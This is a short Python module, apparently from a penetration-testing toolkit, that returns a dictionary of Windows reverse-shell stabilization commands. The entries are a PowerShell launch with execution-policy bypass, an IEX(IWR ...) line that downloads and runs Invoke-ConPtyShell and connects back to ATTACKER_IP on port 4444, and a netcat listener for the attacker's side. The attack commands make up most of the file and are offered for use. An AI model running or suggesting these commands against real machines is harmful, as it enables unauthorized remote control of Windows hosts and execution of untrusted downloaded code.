"""Windows shell stabilization techniques"""

def get_windows_techniques():
    """
    Get all Windows shell stabilization techniques
    Returns: Dict of techniques
    """
    techniques = {
        'powershell_upgrade': {
            'name': 'PowerShell Interactive Shell',
            'commands': [
                'powershell.exe -NoP -NonI -Exec Bypass',
            ],
            'notes': 'Upgrade from cmd.exe to PowerShell'
        },
        'conpty': {
            'name': 'ConPTY Full Interactive',
            'commands': [
                '# Use Invoke-ConPtyShell for full interactive Windows shell',
                'IEX(IWR https://raw.githubusercontent.com/antonioCoco/ConPtyShell/master/Invoke-ConPtyShell.ps1 -UseBasicParsing)',
                'Invoke-ConPtyShell ATTACKER_IP 4444'
            ],
            'notes': 'Full interactive shell with proper terminal emulation'
        },
        'rlwrap': {
            'name': 'Rlwrap (Attacker Side)',
            'commands': [
                '# On attacker machine before receiving shell:',
                'rlwrap nc -lvnp 4444'
            ],
            'notes': 'Provides readline functionality (history, arrows, etc.)'
        }
    }
    
    return techniques